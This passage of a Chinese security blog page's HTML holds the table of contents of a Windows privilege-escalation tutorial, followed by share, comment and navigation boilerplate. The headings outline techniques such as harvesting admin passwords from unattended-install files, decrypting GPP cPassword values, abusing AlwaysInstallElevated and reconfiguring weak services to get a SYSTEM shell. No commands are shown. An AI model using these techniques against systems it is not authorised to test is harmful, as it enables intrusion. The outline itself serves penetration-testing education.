href="#为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC-收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows-补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。"><span class="toc-number">3.0.4.</span> <span class="toc-text">为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC 收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows 补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#你可以从这里下载我的脚本"><span class="toc-number">3.0.5.</span> <span class="toc-text">你可以从这里下载我的脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#你也可以从这里下载我利用脚本收集的信息样本"><span class="toc-number">3.0.6.</span> <span class="toc-text">你也可以从这里下载我利用脚本收集的信息样本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Δt-for-t5-to-t6-Quick-Fails"><span class="toc-number">4.</span> <span class="toc-text">Δt for t5 to t6 - Quick Fails</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了"><span class="toc-number">4.0.1.</span> <span class="toc-text">继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#尽管已经通过我的WMIC-脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。"><span class="toc-number">4.0.2.</span> <span class="toc-text">尽管已经通过我的WMIC 脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#提权的EXP-就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些-，大家可以下载对应版本的Windows-试试这些EXP。"><span class="toc-number">4.0.3.</span> <span class="toc-text">提权的EXP 就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些:，大家可以下载对应版本的Windows 试试这些EXP。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。"><span class="toc-number">4.0.4.</span> <span class="toc-text">下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#通常这些敏感文件会出现在下面目录中："><span class="toc-number">4.0.5.</span> <span class="toc-text">通常这些敏感文件会出现在下面目录中：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#这些配置文件极可能包含明文密码，也可能会出现base64-编码的情况，下面是一些配置文件的事例："><span class="toc-number">4.0.6.</span> <span class="toc-text">这些配置文件极可能包含明文密码，也可能会出现base64 编码的情况，下面是一些配置文件的事例：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GPO-首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL-中的Groups-xml-文件，任何经过身份认证的用户都可以读取该文件。尽管xml-文件中的密码通过使用AES-加密来保证安全性，但是通过msdn-发布的静态密钥可以很轻松的解密。"><span class="toc-number">4.0.7.</span> <span class="toc-text">GPO 首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL 中的Groups.xml 文件，任何经过身份认证的用户都可以读取该文件。尽管xml 文件中的密码通过使用AES 加密来保证安全性，但是通过msdn 发布的静态密钥可以很轻松的解密。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#除了Groups-xml-以外，其他几个策略首选项文件也可能存在-“cPassword”-属性"><span class="toc-number">4.0.8.</span> <span class="toc-text">除了Groups.xml 以外，其他几个策略首选项文件也可能存在 “cPassword” 属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。"><span class="toc-number">4.0.9.</span> <span class="toc-text">如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。"><span class="toc-number">4.0.10.</span> <span class="toc-text">除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#接下来我们要查找一个奇怪的注册表设置-“AlwaysInstallElevated”-如果启动此设置，它会允许任何用户将-msi-文件安装为NT-AUTHORITY-SYSTEM-。"><span class="toc-number">4.0.11.</span> <span class="toc-text">接下来我们要查找一个奇怪的注册表设置 “AlwaysInstallElevated” , 如果启动此设置，它会允许任何用户将 *.msi 文件安装为NT AUTHORITY \ SYSTEM 。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出-SYSTEM-shell-通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7-并没有这两个键值。"><span class="toc-number">4.0.12.</span> <span class="toc-text">为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出 SYSTEM shell. 通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7 并没有这两个键值。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#最后我们也可能通过下面的命令来挖到未知的宝藏"><span class="toc-number">4.0.13.</span> <span class="toc-text">最后我们也可能通过下面的命令来挖到未知的宝藏</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Δt-for-t7-to-t10-Roll-Up-Your-Sleeves"><span class="toc-number">5.</span> <span class="toc-text">Δt for t7 to t10 - Roll Up Your Sleeves</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows-服务和文件-文件夹-权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows-XP-系统"><span class="toc-number">5.0.1.</span> <span class="toc-text">希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows 服务和文件/文件夹 权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows XP 系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#接下来我们将利用一个Windows中大神级的工具集Sysinternals-Suite-中的accesschk-exe-来批量检查权限信息，读者可以从这里下载这个工具集"><span class="toc-number">5.0.2.</span> <span class="toc-text">接下来我们将利用一个Windows中大神级的工具集Sysinternals Suite 中的accesschk.exe 来批量检查权限信息，读者可以从这里下载这个工具集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#接下来我们从Windows-的服务开始，通过重新配置service-的参数能够让我们快速达到目的。"><span class="toc-number">5.0.3.</span> <span class="toc-text">接下来我们从Windows 的服务开始，通过重新配置service 的参数能够让我们快速达到目的。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#我们也可以使用accesschk-来检查每个服务的权限级别"><span class="toc-number">5.0.4.</span> <span class="toc-text">我们也可以使用accesschk 来检查每个服务的权限级别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Accesschk-能够自动检查在某个用户等级下我们对于Windows-服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查-“Authenticated-Users”-。"><span class="toc-number">5.0.5.</span> <span class="toc-text">Accesschk 能够自动检查在某个用户等级下我们对于Windows 服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查 “Authenticated Users” 。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#咱们来比较一下在Windows-8-和-Windows-XP-SP0-中输出的不同"><span class="toc-number">5.0.6.</span> <span class="toc-text">咱们来比较一下在Windows 8 和 Windows XP SP0 中输出的不同,</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#通过以上信息，我们能看到upnphost-具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹-system-shell"><span class="toc-number">5.0.7.</span> <span class="toc-text">通过以上信息，我们能看到upnphost 具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹 system shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#下图列出了关于Windows-提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM-shell"><span class="toc-number">5.0.8.</span> <span class="toc-text">下图列出了关于Windows 提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM shell.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结语"><span class="toc-number">6.</span> <span class="toc-text">结语</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥-hl0rey-的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！"><span class="toc-number">6.0.1.</span> <span class="toc-text">以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥@hl0rey 的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Windows 提权基础（上）　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section class="youyan" id="comments">
+    <script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2142877';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <aside class="comment-bar">
+        <a href="javascript:void(0);">
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").hover(function(){
+            load$hide();
+        })
+        if (window.location.hash === "#comments") {
+            load$hide();
+        }
+    </script>
+
+    <div id="uyan_frame"></div>
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2018/04/13/Windows-提权基础（下）/" title="上一篇: Windows 提权基础（下）">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/03/30/kali-代理之shadowsocks-proxychains/" title="下一篇: kali 代理之shadowsocks &amp; proxychains">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/04/13/Windows-提权基础（下）/">Windows 提权基础（下）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/13/Windows-提权基础（上）/">Windows 提权基础（上）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/30/kali-代理之shadowsocks-proxychains/">kali 代理之shadowsocks & proxychains</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/28/bash-伪多进程/">bash 伪多进程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/10/Firewalk-原理/">Firewalk 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/08/kali使用入坑指南（二）/">kali使用入坑指南（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/利用iodine绕过防火墙/">利用iodine绕过防火墙</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/kali使用入坑指南(一)/">kali使用入坑指南(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/kali安装KVM入坑笔记/">kali安装KVM入坑笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/JBOSS反序列化漏洞复现/">JOBSS反序列化漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/花式钓鱼法/">花式钓鱼法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/23/RINETD 的妙用/">RINET 的妙用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/27/HTTPS攻击/">HTTPS攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/The-Backdoor-Factory/">The-Backdoor-Factory</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/08/Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/02/MITMF/">MITMF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/02/无线渗透-序章-中间人攻击/">无线渗透(序章)--中间人攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/Slowhttptest/">Slowhttptest</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/TearDrop/">TearDrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/23/SOCKSTRESS/">SOCKSTRESS</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/21/Syn-Flood/">Syn-Flood</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/03/无线渗透(下)—企业级WPA破解/">无线渗透(下)—企业级WPA破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/无线渗透(中)--WPS破解/">无线渗透(中)--WPS破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/无线渗透(上)--WPA加密/">无线渗透(上)--WPA加密</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/信息收集— 僵尸扫描/">信息收集— 僵尸扫描</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 TimeS0ng
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
